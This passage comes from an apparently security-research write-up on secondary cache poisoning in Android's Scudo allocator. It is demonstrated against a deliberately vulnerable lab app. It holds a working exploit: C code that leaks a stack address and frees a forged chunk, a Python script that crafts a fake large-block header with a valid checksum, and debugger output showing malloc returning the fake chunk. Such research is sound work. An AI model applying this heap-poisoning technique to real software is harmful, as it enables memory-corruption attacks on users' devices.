</span></span><span class=line><span class=cl>    <span class=n>Quarantine</span><span class=p>[</span><span class=n>QuarantinePos</span><span class=p>]</span> <span class=o>=</span> <span class=n>Entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>OldestTime</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>OldestTime</span> <span class=o>=</span> <span class=n>Entry</span><span class=p>.</span><span class=n>Time</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>Entry</span> <span class=o>=</span> <span class=n>PrevEntry</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>EntriesCount</span> <span class=o>&gt;=</span> <span class=n>MaxCount</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>IsFullEvents</span><span class=o>++</span> <span class=o>==</span> <span class=mi>4U</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>EmptyCache</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>3</span><span class=p>]</span>    <span class=k>for</span> <span class=p>(</span><span class=n>u32</span> <span class=n>I</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>I</span> <span class=o>&lt;</span> <span class=n>MaxCount</span><span class=p>;</span> <span class=n>I</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>Entries</span><span class=p>[</span><span class=n>I</span><span class=p>].</span><span class=n>CommitBase</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>I</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>Entries</span><span class=p>[</span><span class=n>I</span><span class=p>]</span> <span class=o>=</span> <span class=n>Entries</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>Entries</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>Entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>EntriesCount</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>OldestTime</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>OldestTime</span> <span class=o>=</span> <span class=n>Entry</span><span class=p>.</span><span class=n>Time</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>EntryCached</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>Thus there are three interesting paths of execution:</p><ol><li>No quarantine, i.e. we only run [3], which results in our chunks being placed in the cache!</li><li>Non - full Quarantine, i.e. we run [1]. This will place our entry in the quarantine, but not in the cache! Eventually, the chunk will be cached, but it requires a full cycle of <code>QuarantinePos</code> for that to happen in this function (maybe there is another function that also increments <code>QuarantinePos</code>).</li><li>Full Quarantine, i.e. we run [2]. Therefore, if the quarantine is filled with entries, this function will fetch the next entry from the quarantine, put our chunk into the quarantine and cache the fetched entry.</li></ol><p>A trivial attack for that is to fill the quarantine by calling <code>scudo_free</code> on a crafted large chunk <em>that passes all the checks</em>. Then, after at most <code>Max(Config::SecondaryCacheQuarantineSize, 1u) + 1</code> many calls we are guaranteed to have our chunk cached. Afterwards, when calling <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=497;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>MapAllocator::allocate</code></a>
, this will result in <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=229;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>Cache::retrieve</code></a>
returning the first non - null cache entry, which is, with high probability (ignoring multi-threaded access), our fake chunk. This is similar to <a href=#primary-poisoning>crafting a fake chunk with the primary</a>
, although we should not be limited by <a href=#fake-chunk-mispositioning>decompacting a pointer</a>
.</p><p>It does not seem like there is memory tagging enabled on my system. Therefore, there is no need to bypass the quarantine with the above attack&mldr;the fake chunk can be added to the cache directly.</p><p>Lets try to craft a fake chunk for the secondary. To that end, lets assume we have the following setup:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#define BUFFER_SIZE 0x100
</span></span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=n>buffer</span><span class=p>[</span><span class=n>BUFFER_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span> <span class=mi>0</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>called</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>called</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>jbyteArray</span> <span class=n>ar</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>NewByteArray</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>jbyte</span> <span class=o>*</span><span class=n>leak</span> <span class=o>=</span> <span class=p>(</span><span class=n>jbyte</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>SetByteArrayRegion</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>ar</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>leak</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ar</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>raw</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint8_t</span><span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>GetByteArrayElements</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>chunk</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>uint32_t</span> <span class=n>length</span> <span class=o>=</span> <span class=p>(</span><span class=o>*</span><span class=n>env</span><span class=p>)</span><span class=o>-&gt;</span><span class=nf>GetArrayLength</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>raw</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=n>raw</span><span class=p>,</span> <span class=p>(</span><span class=n>length</span> <span class=o>&lt;=</span> <span class=n>BUFFER_SIZE</span><span class=p>)</span> <span class=o>?</span> <span class=nl>length</span> <span class=p>:</span> <span class=n>BUFFER_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Brings attacker - controlled chunk into secondary cache
</span></span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>buffer</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>);</span> <span class=c1>// large header + combined header
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Triggers potential write - what - where condition. This could also be triggered by another
</span></span></span><span class=line><span class=cl>    <span class=c1>// thread, although it might be problematic what that thread will write and how much...
</span></span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>write_trigger</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>length</span> <span class=o>-</span> <span class=mh>0x40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>memcpy</span><span class=p>(</span><span class=n>write_trigger</span><span class=p>,</span> <span class=n>raw</span> <span class=o>+</span> <span class=mh>0x40</span><span class=p>,</span> <span class=n>length</span> <span class=o>-</span> <span class=mh>0x40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>write_trigger</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span></code></pre></div><p>On first execution of the above code snippet, the address of <code>buffer = 0x7babf29407b0</code> will be leaked. For any other execution, we will try to call <code>free(buffer + 0x30 + 0x10)</code> and <code>malloc(length - 0x40)</code>. Notice that <code>length</code> will be the length of the whole chunk including the headers. When calling <code>malloc</code> we have to provide the size of the user data that does not include the headers!</p><p>Setting a breakpoint right before <code>free</code> yields:</p><pre tabindex=0><code>gefâ¤  i r rdi
    rdi            0x7babf29407f0      0x7babf29407f0
gefâ¤  x/8gx $rdi-0x40
    0x7babf29407b0:	0x00007babf29407b0	0x00007babf29407b0  &lt;--
    0x7babf29407c0:	0x00007babf29407f0	0x0000000000080040    |-- large header
    0x7babf29407d0:	0xffffffffffffffff	0xffffffffffffffff  &lt;--
    0x7babf29407e0:	0xd82d000000000100	0x0000000000000000  &lt;-- combined header + 8 bytes padding
</code></pre><p>Again, if we pass all the checks, i.e. provided a correct large chunk, then the app will <strong>not</strong> abort and not cause a segfault. Also observe that the <code>LargeBlock::Header::Prev</code> and <code>LargeBlock::Header::Next</code> both point to the beginning of <code>LargeBlock::Header</code>. This is because the header has to pass <code>InUseChunks.remove(H)</code>.</p><p>The header could be crafted in the following way:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=c1># Craft large header</span>
</span></span><span class=line><span class=cl><span class=n>lhdr</span> <span class=o>=</span> <span class=n>large_header</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>lhdr</span><span class=o>.</span><span class=n>Prev</span> <span class=o>=</span> <span class=n>pointer</span> <span class=c1># ensure that DoublyLinkedList::remove is nop</span>
</span></span><span class=line><span class=cl><span class=n>lhdr</span><span class=o>.</span><span class=n>Next</span> <span class=o>=</span> <span class=n>pointer</span>
</span></span><span class=line><span class=cl><span class=n>lhdr</span><span class=o>.</span><span class=n>CommitBase</span> <span class=o>=</span> <span class=n>pointer</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x10</span> <span class=c1># pointer to user data</span>
</span></span><span class=line><span class=cl><span class=n>lhdr</span><span class=o>.</span><span class=n>CommitSize</span> <span class=o>=</span> <span class=mh>0x400</span> <span class=o>*</span> <span class=mh>0x200</span> <span class=o>+</span> <span class=mh>0x40</span> <span class=c1># data + headers</span>
</span></span><span class=line><span class=cl><span class=n>lhdr</span><span class=o>.</span><span class=n>MapBase</span> <span class=o>=</span> <span class=mh>0xffffffffffffffff</span>   <span class=c1># irrelevant; for debugging reasons set to -1</span>
</span></span><span class=line><span class=cl><span class=n>lhdr</span><span class=o>.</span><span class=n>MapSize</span> <span class=o>=</span> <span class=mh>0xffffffffffffffff</span>   <span class=c1># irrelevant; for debugging reasons set to -1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Combined header</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span> <span class=o>=</span> <span class=n>unpacked_header</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>ClassId</span> <span class=o>=</span> <span class=mi>0</span> <span class=c1># Secondary allocations have class id 0</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>State</span> <span class=o>=</span> <span class=mi>1</span>   <span class=c1># = allocated</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>SizeOrUnusedBytes</span> <span class=o>=</span> <span class=mi>0</span>   <span class=c1># irrelevant</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>OriginOrWasZeroed</span> <span class=o>=</span> <span class=mi>0</span>   <span class=c1># = malloc&#39;ed chunk</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>Offset</span> <span class=o>=</span> <span class=mi>0</span>  <span class=c1># irrelevant (for now)</span>
</span></span><span class=line><span class=cl><span class=n>combined_header</span><span class=o>.</span><span class=n>Checksum</span> <span class=o>=</span> <span class=n>utils</span><span class=o>.</span><span class=n>android_crc32</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>pointer</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>,</span>  <span class=c1># user data pointer: sizeof (LargeBlock::Header) = 0x30, sizeof (Chunk::UnpackedHeader) = 0x8, 8 bytes padding -&gt; 0x40</span>
</span></span><span class=line><span class=cl>    <span class=n>combined_header</span><span class=o>.</span><span class=n>pack</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Send chunk</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x42</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x400</span> <span class=o>*</span> <span class=mh>0x200</span> <span class=c1># 512KiB to trigger secondary allocation</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>forward</span><span class=p>(</span><span class=n>lhdr</span><span class=o>.</span><span class=n>bytes</span><span class=p>()</span> <span class=o>+</span> <span class=n>combined_header</span><span class=o>.</span><span class=n>bytes</span><span class=p>()</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>data</span><span class=p>)</span>
</span></span></code></pre></div><p>Notice that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=287" target=_blank rel=noopener><code>canCache</code></a>
imposes an upper bound on <code>LargeBlock::Header::CommitSize</code>, which is <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/allocator_config.h;l=113;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>2 &lt;&lt; 20</code></a>
. Observe that there is no lower bound to <code>LargeBlock::Header::CommitSize</code> that restricts us from introducing a fake chunk into the cache (see <a href=#neat-little-side-effect>later</a>
for more on a lower bound)! (see <a href=#future-work>future work</a>
for an attack idea that abuses the fact that <code>malloc</code> calls do not have any control over the size field. This implies that allocations that are in size range of the primary will be taken from the primary. Setting <code>fake.CommitSize &lt;= &lt;max primary allocation size></code> will result in a dead cache entry, because it will be smaller than <strong>any</strong> requested size allocated by the secondary assuming that the primary did not fail to allocate)</p><p>Right before calling <code>malloc(buffer + 0x40)</code> we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>gef</span><span class=err>â¤</span>  <span class=n>i</span> <span class=n>r</span> <span class=n>rdi</span>
</span></span><span class=line><span class=cl>    <span class=n>rdi</span>            <span class=mh>0x80000</span>             <span class=mh>0x80000</span>
</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>â¤</span>  <span class=n>ni</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>â¤</span>  <span class=n>i</span> <span class=n>r</span> <span class=n>rax</span>
</span></span><span class=line><span class=cl>    <span class=n>rax</span>            <span class=mh>0x7babf2940830</span>      <span class=mh>0x7babf2940830</span>
</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>â¤</span>  <span class=n>x</span><span class=o>/</span><span class=mi>8</span><span class=n>gx</span> <span class=err>$</span><span class=n>rax</span><span class=o>-</span><span class=mh>0x40</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7babf29407f0</span><span class=o>:</span>	<span class=mh>0x00007bac40c76fc0</span>	<span class=mh>0x0000000000000000</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7babf2940800</span><span class=o>:</span>	<span class=mh>0x00007babf29407f0</span>	<span class=mh>0x0000000000080040</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7babf2940810</span><span class=o>:</span>	<span class=mh>0xffffffffffffffff</span>	<span class=mh>0xffffffffffffffff</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7babf2940820</span><span class=o>:</span>	<span class=mh>0x216a000000000100</span>	<span class=mh>0x4242424242424242</span>
</span></span></code></pre></div><p>As can be seen from the fields <code>LargeBlock::Header::MapBase = -1</code> and <code>LargeBlock::Header::MapSize = -1</code>, we definitely get our chunk back. There cannot be any other chunk with such a chunk header, because this would imply that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=542;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>mmap</code></a>
returned <code>-1</code>, which is not a valid user - space address on Android. Also observe that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=210;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>the last cached large chunk is retrieved first</a>
. Hence, if we called <code>malloc</code> next, then our fake chunk would be considered first!</p><p>Still, there is something off:</p><ol><li><code>LargeBlock::Header::Prev = 0x00007bac40c76fc0</code>, which is not our chunk.</li><li><code>LargeBlock::Header::Next = 0x0000000000000000</code>, so its the last element in <code>InUseChunks</code></li><li><code>LargeBlock::Header::CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40</code>, where <code>0x7babf29407b0</code> was the address of the large header before calling <code>free</code>. But we can see that the <code>CommitBase</code> remained the same and also that the newly &ldquo;allocated&rdquo; chunk is now located at <code>0x00007babf29407f0</code>, which is the <code>CommitBase</code> value of our fake chunk (technically, this could be a coincidence, because <code>0x7babf29407f0 = 0x7babf29407b0 + 0x40</code>, which is just shifted by the size of all header altogether including padding. The argument against that is that the secondary by itself should have no reason to return a chunk that is located on the stack, i.e. overlapping with our <code>buffer</code>).</li></ol><p>As is the case with <a href=#primary-poisoning>primary poisoning</a>
, the contents have not been cleared:</p><pre tabindex=0><code>gefâ¤  x/4gx $rax
    0x7babf2940830:	0x4242424242424242	0x4242424242424242
    0x7babf2940840:	0x4242424242424242	0x4242424242424242
</code></pre><p>which again allows for distinguishing fake chunk creation and preinitialization of memory. When attempting to preinitialize a data structure, we have to take the shift of <code>0x40</code> into account (we will see why the shift is there later).</p><h5 id=challenges>Challenges</h5><p>Similar to <a href=#primary-poisoning>primary poisoning</a>
, there are some pitfalls with <a href=#secondary-cache-poisoning>secondary cache poisoning</a>
, which will be discussed in this section.</p><h6 id=one-secondary-to-rule-em-all>One Secondary to rule &rsquo;em all</h6><p>Observe that when allocating memory from the secondary via <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>malloc(&lt;large size>)</code></a>
, there is only one instance of the secondary that actually handles these allocations (as opposed to the primary, which may &ldquo;change&rdquo; depending on the outcome of <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>getTSDAndLock</code></a>
. Actually the primary itself does not change, but the cache that is based on the primary. I will use primary and a cache that comes from the primary interchangably, because the <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=992;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1" target=_blank rel=noopener><code>Primary</code></a>
is not used for any allocations directly).</p><p>Considering the empirical observation that the <em>damnvulnerableapp:VulnerableActivity</em> averages to roughly 20 threads per run, it is very likely that other threads will also use the secondary. One particular run shows 25 threads running in parallel:</p><pre tabindex=0><code>gefâ¤  i threads
    Id   Target Id                            Frame 
    1    Thread 16516.16516 &#34;nerableActivity&#34; 0x00007baef80269aa in __epoll_pwait () from libc.so
    6    Thread 16516.16521 &#34;Signal Catcher&#34;  0x00007baef80263ea in __rt_sigtimedwait () from libc.so
    7    Thread 16516.16522 &#34;perfetto_hprof_&#34; 0x00007baef8025747 in read () from libc.so
    8    Thread 16516.16523 &#34;ADB-JDWP Connec&#34; 0x00007baef8026aaa in __ppoll () from libc.so
    9    Thread 16516.16524 &#34;Jit thread pool&#34; 0x00007baef7fcddf8 in syscall () from libc.so
    10   Thread 16516.16525 &#34;HeapTaskDaemon&#34;  0x00007baef7fcddf8 in syscall () from libc.so
    11   Thread 16516.16526 &#34;ReferenceQueueD&#34; 0x00007baef7fcddf8 in syscall () from libc.so
    12   Thread 16516.16527 &#34;FinalizerDaemon&#34; 0x00007baef7fcddf8 in syscall () from libc.so
    13   Thread 16516.16528 &#34;FinalizerWatchd&#34; 0x00007baef7fcddf8 in syscall () from libc.so
    14   Thread 16516.16529 &#34;Binder:16516_1&#34;  0x00007baef80259e7 in __ioctl () from libc.so
    15   Thread 16516.16530 &#34;Binder:16516_2&#34;  0x00007baef80259e7 in __ioctl () from libc.so
    16   Thread 16516.16533 &#34;Binder:16516_3&#34;  0x00007baef80259e7 in __ioctl () from libc.so
    17   Thread 16516.16538 &#34;Profile Saver&#34;   0x00007baef7fcddf8 in syscall () from libc.so
    18   Thread 16516.16539 &#34;RenderThread&#34;    0x00007baef80269aa in __epoll_pwait () from libc.so
    19   Thread 16516.16542 &#34;pool-2-thread-1&#34; 0x00007baef8026aaa in __ppoll () from libc.so
    20   Thread 16516.16544 &#34;hwuiTask0&#34;       0x00007baef7fcddf8 in syscall () from libc.so
    21   Thread 16516.16545 &#34;hwuiTask1&#34;       0x00007baef7fcddf8 in syscall () from libc.so
    22   Thread 16516.16546 &#34;Binder:16516_3&#34;  0x00007baef7fcddf8 in syscall () from libc.so
    23   Thread 16516.16547 &#34;Thread-3&#34;        0x00007baef802656a in recvfrom () from libc.so
    * 24   Thread 16516.16548 &#34;Thread-2&#34;        0x00007babf33de9ec in Java_com_damnvulnerableapp_vulnerable_modules_SecondaryFakeModule_free () from libSecondaryFakeModule.so
    25   Thread 16516.16562 &#34;Binder:16516_4&#34;  0x00007baef80259e7 in __ioctl () from libc.so
</code></pre><p>As with the <a href=#thievish-threads>primary</a>
, our fake chunk may be stolen by another thread, depending on the allocations performed.</p><p>Another problem is that if the cache is <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=202;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>full</a>
and there are <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=203;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>not &ldquo;enough&rdquo; (4) allocations</a>
happening to balance out the congestion of the cache, the cache will be <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=221;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>emptied</a>
. This basically <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=357;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>invalidates all cache entries</a>
and <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=364;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>unmaps</a>
them. Having <code>munmap</code> called on our fake chunk might seem problematic, but it turns out that running <code>munmap(0x0, 0x1)</code> returns successfully&mldr;Therefore, setting <code>LargeBlock::Header::MapBase = 0</code> and <code>LargeBlock::Header::MapSize = 1</code> at least prevents the app from aborting. Of course, having our fake cache entry stripped from the cache mitigates this attack.</p><p>To conclude, <strong>Secondary Cache Poisoning is probabilistic</strong> just like <a href=#pitfalls-and-challenges>Primary Poisoning</a>
!</p><h6 id=shifted-user-data>Shifted User Data</h6><p>Recall that our fake chunk returned from calling <code>malloc</code> is located at <code>fake.CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40</code>. Therefore, the user data starts at <code>0x7babf29407b0 + 0x40 + 0x40 = 0x7babf2940830</code>, because of the headers and padding (see example above). At best, we want to show that <code>malloc(size) = fake.CommitBase + 0x40</code>, because this would allow us to precisely control where the fake chunk is located. Observe that there seem to be no limitations on the position of a secondary chunk as opposed to <a href=#fake-chunk-mispositioning>primary chunks</a>
, because the <code>LargeBlock::Header::CommitBase</code> is not compacted!</p><p>Lets say we successfully called <code>free(buffer + 0x40)</code> and therefore introduced our fake chunk into the secondary cache. Also, assume that the next call of our thread to <code>malloc(fake.CommitSize - 0x40)</code> returns our fake chunk, if available in terms of size and pointer constraints (no other thread can steal it), and that <code>0x10 | fake.CommitBase</code> and <code>0x10 | fake.CommitSize</code> (i.e. everything is nicely aligned). We want to prove that these assumptions imply that <code>malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40</code>.</p><p>First, observe that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=145;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>MapAllocatorCache::store</code></a>
does not change <code>fake.CommitBase</code> and <code>fake.CommitSize</code>. To that end, notice that all accesses to <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=155;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>Entry.CommitBase</code></a>
and <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=156;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>Entry.CommitSize</code></a>
, are by value and <strong>not</strong> by reference. Thus, the actual cache entry will contain our chosen <code>fake.CommitBase</code> and <code>fake.CommitSize</code>.</p><p>When allocating from the secondary cache, <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=229;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>retrieve</code></a>
is called. Based on the assumption that <code>malloc(fake.CommitSize - 0x40)</code> returns our fake chunk if available, we need to show that</p><ol><li>the sizes match, s.t. our fake chunk is actually part of the set of chunks that fit our allocation request. Then, by assumption, the fake chunk will be returned.</li><li>the <code>CommitBase</code> is somehow modified by a constant.</li></ol><p>For the first point, observe that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>Secondary.deallocate</code></a>
is given the allocation size that is passed to <code>malloc</code>. Therefore, <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=514;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>MapAllocatorCache::retrieve</code></a>
is called with <code>Size = fake.CommitSize - 0x40</code>. We also know that <code>fake_entry.CommitSize = fake.CommitSize</code> (we will call the entry representing our fake chunk <code>fake_entry</code>). Hence <code>CommitBase := fake_entry.CommitBase</code> and <code>CommitSize := fake_entry.CommitSize</code>. Then it has to hold that</p><ol><li><a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=249;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>HeaderPos > CommitBase + CommitSize</code></a>
. This is computed in the following:<pre tabindex=0><code>AllocPos  = roundDownTo(CommitBase + CommitSize - Size, Alignment)
        = roundDownTo(CommitBase + CommitSize - (fake.CommitSize - 0x40), Alignment)
        = roundDownTo(CommitBase + CommitSize - (CommitSize - 0x40), Alignment)
        = roundDownTo(CommitBase + 0x40), Alignment)   &lt;-- assumption on 0x10 divides CommitBase
        = CommitBase + 0x40

HeaderPos = AllocPos - Chunk::getHeaderSize() - LargeBlock::getHeaderSize();
        = (CommitBase + 0x40) - 0x10 - 0x30
        = CommitBase
